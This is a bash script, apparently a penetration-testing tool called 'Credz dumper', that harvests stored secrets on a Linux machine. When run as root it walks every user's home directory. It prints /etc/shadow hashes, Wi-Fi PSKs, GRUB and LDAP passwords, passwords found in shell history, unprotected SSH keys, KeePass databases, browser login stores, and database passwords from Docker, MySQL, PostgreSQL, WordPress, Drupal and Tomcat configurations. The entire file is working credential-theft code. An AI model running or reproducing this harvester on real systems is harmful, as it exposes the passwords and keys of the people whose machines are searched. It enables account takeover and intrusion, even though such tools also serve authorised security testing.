#! /bin/bash
# If there is a will, there is a way
#			0xMitsurugi
# v0.0.4

############## Credz dumper ##############################
# This script will try to grab all stored password/secrets
# on a linux box.

# Defaults vars
ROOT=0    #If set to 1, we'll try to get files usually owned by root
	  #will produce errors, but could eventually get some things
TAR=0     #should we copy and save files for later use 0: no, 1: yes
	  #under planning
VERBOSE=0 #should we print failed checks? 1 yes, 0 no

##########################################################
# dumping functions

_grep_file() {
	#if we are root, loop, else do it for current user only
	# $1 name of check
	# $2 file to check
	# $3 pattern to grep
	name="$1"
	file="$2"
	pattern="$3"
	ROOT=$(_check_root)
	if [ $ROOT == "yes" ]; then
		for userhome in $(grep -E "/bin/(ba|z)?sh" /etc/passwd | cut -d ":" -f6 )
			do
				_grep_file_user "$name" "$userhome" "$file" "$pattern"
			done
	else
		_grep_file_user "$name" $HOME "$file" "$pattern"
	fi
}

_dump_wifi_wpa_supplicant() {
	#Check if there are some WPA password saved in wpa_supplicant.conf
	#First, find conf file, if there are many, try each of them
	#Second, extract password
	CONF_FILE=''
	#[ -r /etc/wpa_supplicant/wpa_supplicant.conf ] && _grep_file_user "WPA SUPPLICANT" "/etc/wpa_supplicant" "wpa_supplicant.conf" "-B6 password"
	for conffile in /etc/wpa_supplicant.d/*conf /etc/wpa_supplicant/*.conf /etc/wpa_supplicant.conf
	do
		_grep_file_user "WPA SUPPLICANT" "" "$conffile" "-B6 psk="
	done


}

_dump_wifi_wpa_nm() {
	#Spits any saved psk with SSID
	#If directory doesn't exist, get out
	[ -d /etc/NetworkManager/system-connections/ ] || return
	unset DATA
	OLDIFS=$IFS
	IFS=$'\n'
	DATA=$(find /etc/NetworkManager/system-connections -type f )
	if [ ${#DATA} -gt 1 ]; then
		for ssid in $DATA
		do
			if grep -q psk= $ssid; then
				_dump_name "WPA PSK saved in NetworkManager"
				_print_win "$ssid" "$(grep "psk=" "$ssid")"
			fi
		done
	else
		[ $VERBOSE -eq 1 ] && _dump_name "WPA PSK saved in NetworkManager"
		_print_lose "/etc/NetworkManager/system-connections/*" "No PSK saved nor files"
	fi
	IFS=$OLDIFS
}

_dump_grub() {
	#Sometimes, grub have a password
	if [ -r /etc/grub/grub.cfg ]; then
		#I'm reusing the _grep_file_user function because it's convenient
		_grep_file_user "GRUB password" "/etc/grub" "grub.cfg" "password"
	fi
	#Some distros use another scheme (debian)
	if [ -d /etc/grub.d/ ]; then
		#Sometimes password is in one of those multiples files
		_grep_file_user "GRUB password" "/etc/grub.d" "." "-r password"
	fi
}

_dump_ldap() {
	#Sometimes, a linux box is binded to an LDAP
	for secrets in libnss-ldap.secret ldap.secret pam_ldap.secret
	do
		if [ -r /etc/${secrets} ]; then
			_grep_file_user "LDAP password" "/etc" "${secrets}" "-v '^$'"
		fi
	done
}

_grep_file_user() {
	# $1 name
	# $2 home
	# $3 file
	# $4 pattern
	name=$1
	home=$2
	file=$3
	pattern=$4
	#Just in case:
	OLDIFS=$IFS
	IFS=$' \t\n'
	#_dump_name "$name credz [$home]"
	if [ -r ${home}/${file} ]; then
		grep -q $pattern ${home}/${file}
		SOMETHING=$?
		DATA=$(grep $pattern ${home}/${file})
		if [ $SOMETHING -eq 1 ]; then
		       echo -n ""
		else
		       _dump_name "$name credz [$home]"
		       _print_win "${home}/${file}" "$DATA"
		fi
	else
		[ $VERBOSE -eq 1 ] && _dump_name "$name credz [$home]"
		_print_lose "${home}/${file}" "no access to file"
	fi
	IFS=$OLDIFS
}

_dump_shadow() {
	#If we are root, dump shadow file
	#and start preheating of crackingStation-128CPU
	ROOT=$(_check_root)
	if [ $ROOT == "yes" ];then
		_dump_name "Interesting data in shadow file"
		DATA=$(egrep -v ":\*:|:\!\:" /etc/shadow)
		_print_win "/etc/shadow" "$DATA"
	fi
}

_dump_chrome_user() {
	#Try to locate file with login details
	#It should contains login in clear and pass in (clear? ciphered? Don't know)
	#$1 is home dir
	if [ -r $1/.config/google-chrome/Default/Login\ Data ]; then
		_dump_name "Google Chrome login details"
		_print_win "$1/.config/google-chrome/Default/Login\ Data" "Check this file, it may contains credz"
	fi
}

_dump_firefox_user() {
	#Try to find some logins.json files, might contain juicy info
	#We don't decrypt them, that's to [hard|long] in pure bash
	#if you want passwd, get them and use any programs which do the job
	# See : https://support.mozilla.org/fr/questions/1154032 or google "firefox decrypt password key3.db"
	#$1 is home dir
	home=$1
	#this regexp avoids the profiles.ini file
	for d in $1/.mozilla/firefox/????????.????*
	do
		if [ -r "$d"/key3.db -a -r "$d"/logins.json ]; then
			_dump_name "firefox logins.json and key3.db file"
			_print_win "$d/logins.json" "Check this file, it have credz inside"
			_print_win "$d/key3.db" "This file have the key to open logins.json"
		fi
	done
}

_loop_users() {
	#$1 is the name of the function
	if [ $(_check_root) == "yes" ]; then
		#We loop through user who have a shell bash, zsh or sh
		for userhome in $(grep -E "/bin/(ba|z)?sh" /etc/passwd | cut -d ":" -f6 )
		do
			$1 "$userhome"
		done
	else
		$1 $HOME
	fi
}

_dump_ssh_keys() {
	#We need to find ssh keys, and unprotected ssh keys
	#$1 is home dir
	home=$1
	if [ -d $home/.ssh ]; then
		OLDIFS=$IFS
		IFS=$'\n'
		SSHKEYFILE=$(find $home/.ssh/ -type f)
		for f in $SSHKEYFILE
		do
			if grep -q "BEGIN RSA" $f; then
				if grep -q "ENCRYPTED" $f; then
					[ $VERBOSE -eq 1 ] && _dump_name "SSH Keys"
					_print_lose "$f" "ssh key protected with passphrase"
				else
					_dump_name "SSH Keys"
					_print_win "$f" "ssh key without protection"
				fi
			fi
		done
		IFS=$OLDIFS
	else
		_print_lose "$home" "No .ssh directory"
	fi

}

_dump_keepassx() {
	#We try to find keepass .kdb and .kdbx files
	#We use find command, and we fail fast (maxdepth=3) to avoid infinite directories
	#$1 is home dir
	home=$1
	OLDIFS=$IFS
	IFS=$'\n'
	KEEPASSX=$(find "$home" -maxdepth 3 -iname "*.kdb?")
	if [ ${#KEEPASSX} -gt 1 ]; then
		_dump_name "keepassx file"
		#What if we have space in names?
		for f in $KEEPASSX
		do
			if [ -f $(dirname ${f})"/."$(basename ${f})".lock" ]; then
				#If keepass is running, U can try to dump memory and search for master pw..
				_print_win "$f" "Keepassx database open? (lock file found)"
			else
				_print_win "$f" "Keepassx database"
			fi
		done
	else
		[ $VERBOSE -eq 1 ] && _dump_name "keepassx file"
		_print_lose "$home" "No keepassx file found (no *.kdb?)"
	fi
	IFS=$OLDIFS
}

_dump_wordpress() {
	#Webapps are a little weird. I don't make any assumptions such as userid
	#Let try with anybody, and if we find a file, let's rock
	#First, find WebRoot (apache? nginx? others?)
	#Second, find wp-config.php and grep it!
	if [ -d /etc/apache2/sites-available/ ]; then
		for site in /etc/apache2/sites-available/*
		do
			#This regex avoids comments
			#Are we sure we have one and only one DocumentRoot in conf file?
			DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
			OLDIFS=$IFS
			IFS=$'\n'
			WPCONF=$(find $DOCROOT -maxdepth 3 -name "wp-config.php*")
			if [ ${#WPCONF} -gt 1 ]; then
				#Sometimes we have other credz in wp-config.php such as ftp?
				for wpconf in $WPCONF
				do
					CREDZ=$(grep -B4 -A1 DB_PASSWORD $wpconf)
					_dump_name "Wordpress config file"
					_print_win "$wpconf" "$CREDZ"
				done
			else
				[ $VERBOSE -eq 1 ] && _dump_name "Wordpress config file"
				_print_lose "$DOCROOT" "No wordpress wp-config.php found"
			fi
			IFS=$OLDIFS
		done
	fi

}

_dump_drupal() {
	#And now drupal
	#Maybe use same code with wordpress?
	if [ -d /etc/apache2/sites-available/ ]; then
		for site in /etc/apache2/sites-available/*
		do
			#This regex avoids comments
			#Are we sure we have one and only one DocumentRoot in conf file?
			DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
			OLDIFS=$IFS
			IFS=$'\n'
			DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
			if [ ${#DRUPALCONF} -gt 1 ]; then
				for drupalconf in $DRUPALCONF
				do
					#Sometimes we have other credz in settings.php?
					CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
					if [ ${#CREDZ} -gt 1 ]; then
						_dump_name "Drupal config file"
						_print_win "$drupalconf" "$CREDZ"
					fi
				done
			else
				[ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
				_print_lose "$DOCROOT" "No drupal settings.php found"
			fi
			IFS=$OLDIFS
		done
	fi

}

_dump_tomcat() {
	#This is not easy because $CATALINA_HOME (or equivalent) could point
	#anywhere... and folders name conf/ are prone to false positive...
	# Sooo... at first try to imagine where your tomcat could be.
	#then grep file for passwords \o/
	tomcatpath="/"
	for dir in /var/www /var/www/html /srv/www /opt /usr/local /srv
	do
		[ -d $dir ] && tomcatpath=$tomcatpath" $dir"
	done
	#now try to go one step lower
	for DIRS in $tomcatpath
	do
		OLDIFS=$IFS
		IFS=$'\n'
		tomcathome=$(find $DIRS -maxdepth 1 -type d)
		for tomcat in $tomcathome
		do
			if [ -r $tomcat/conf/server.xml ]; then
				_grep_file_user "ConnectionDB in tomcat" "$tomcat/conf" "server.xml" "-B 1 connectionURL"
			fi
			if [ -r $tomcat/conf/tomcat-users.xml ]; then
				_grep_file_user "tomcat users" "$tomcat/conf" "tomcat-users.xml" "password"
			fi
		done
		IFS=$OLDIFS
	done
}

##########################################################
# internal functions
RESTORE=$(echo -en '\033[0m')
RED=$(echo -en '\033[00;31m')
GREEN=$(echo -en '\033[00;32m')
YELLOW=$(echo -en '\033[00;33m')
BLUE=$(echo -en '\033[00;34m')
MAGENTA=$(echo -en '\033[00;35m')
PURPLE=$(echo -en '\033[00;35m')
CYAN=$(echo -en '\033[00;36m')
LIGHTGRAY=$(echo -en '\033[00;37m')
LRED=$(echo -en '\033[01;31m')
LGREEN=$(echo -en '\033[01;32m')
LYELLOW=$(echo -en '\033[01;33m')
LBLUE=$(echo -en '\033[01;34m')
LMAGENTA=$(echo -en '\033[01;35m')
LPURPLE=$(echo -en '\033[01;35m')
LCYAN=$(echo -en '\033[01;36m')
WHITE=$(echo -en '\033[01;37m')

_banner () {
	echo ${RED}"#####################################################"${RESTORE}
	echo ${RED}"#"${RESTORE}"		  Gimme credz !!!"
	echo ${RED}"#####################################################"${RESTORE}
	#echo "One-file bash-only script"
	#echo "Harvest all known credz at once"
	#echo
	echo ${RED}"#"${RESTORE}"			      The name's 0xMitsurugi"
	echo ${RED}"#"${RESTORE}"					Remember it!"
	echo ${RED}"#####################################################"${RESTORE}
}

_dump_name() {
	h=$(echo $1 | md5sum | cut -d " " -f1)
	echo
	echo ${GREEN}"***** "${RESTORE}${1}" "${GREEN}"***** "${RESTORE}
	#echo ${GREEN}"#################"${RESTORE} $1 ${GREEN}"###########################"${RESTORE}
	echo
}

_check_root() {
	if [ "$ROOT" == "1" ]; then
		#We pretend to be root to make checks
		echo "yes"
	else
		#otherwise, check for real
		if [[ $EUID -ne 0 ]]; then
			echo "no"
		else
			echo "yes"
		fi
	fi
}

_print_win() {
	#$1 : file containing secret
	#$2 : secret
	echo ${GREEN}"[+] GOT ONE!!"${RESTORE}
	echo ${LBLUE}"File: "${RESTORE} $(realpath "$1")
	echo "$2"
	#This is the place to save file for a future use
}

_print_lose() {
	#$1 : file containing secret
	#$2 : lose message
	if [ $VERBOSE -eq 1 ]; then
		echo ${RED}"[ ] NOPE"
		echo ${LBLUE}"File: "${RESTORE} "$1"
		echo "$2"
	fi
}

_echo_error() {
	echo ${RED}"[!] Error"$RESTORE
	echo "$1"

}

_paragraph() {
	echo
	echo ${RED}"#################"${RESTORE} $1 ${RED}"###########################"${RESTORE}
}

##########################################################
# Main loop

_banner
#Are we saving everything?
#if [ $TAR -eq 1 ]; then
#	if [ -d TAR/ ]; then
#		_echo_error "TAR/ exists. Disabling output"
#		TAR=0
#	else
#		mkdir TAR/
#	fi
#fi

###################### If we are root, then get kingdom keys
# see the comment in _check_root if U want to try anyway those checks
#Start dump!!
if [ $(_check_root) == "yes" ]; then
	_paragraph "ROOT ACCESS!"
	_dump_shadow
	_dump_wifi_wpa_nm
	_dump_wifi_wpa_supplicant
	_dump_grub
	_dump_ldap
	_grep_file_user "Password in fstab" "/etc" "fstab" " -E [^<]pass"
	#Should we dump LUKS key? For what usage if we are in pentest?
	# in case you need it -> dmsetup table --showkeys crypto
fi

###################### Have fun with credz stored in files
_paragraph "FILES!"
#Documentation:
#_grep_file "Name of check" "Filepath (related to $HOME/) "grep pattern"
_grep_file ".docker/config.json" ".docker/config.json" "-B1 auth\":"
_grep_file "mysql_my_cnf" ".my.cnf" "-B1 password"
_grep_file "pidgin (libpurple)" ".purple/accounts.xml" "-B1 password"
_grep_file "hexchat passwords for servers" ".config/hexchat/servlist.conf" "-E -B1 C="
_grep_file "postgreSQL" ".pgpass" ":"
_grep_file "mysql pass in CLI history" ".bash_history" "-E mysql.*-p"
_grep_file "rdesktop pass in CLI history" ".bash_history" "-E rdesktop.*-p "
_grep_file "password switch found in history" ".bash_history" "-- "--password""
_grep_file "mysql pass in CLI history" ".zsh_history" "-E mysql.*-p"
_grep_file "rdesktop pass in CLI history" ".zsh_history" "-E rdesktop.*-p "
#Always interesting to look there
_loop_users _dump_ssh_keys
#Keepass database are good targets
_loop_users _dump_keepassx

######################### And now, browsers
_paragraph "BROWSERS!"
_loop_users _dump_firefox_user
_loop_users _dump_chrome_user
#old browsers? such as Konqueror?


############################# Play with webapps!
#Find tomcat home, dump admin pass 
#How to find tomcat home reliably???
_paragraph "WEB APPS!"
_dump_wordpress
_dump_drupal
_dump_tomcat
#Add Directory Alias apache config?
#if we found locatedb, should we use it?
#.yml files (symphony) => credz config.yml or parameters.yml

#Databases
#find mysql file, postgresql file, etc..

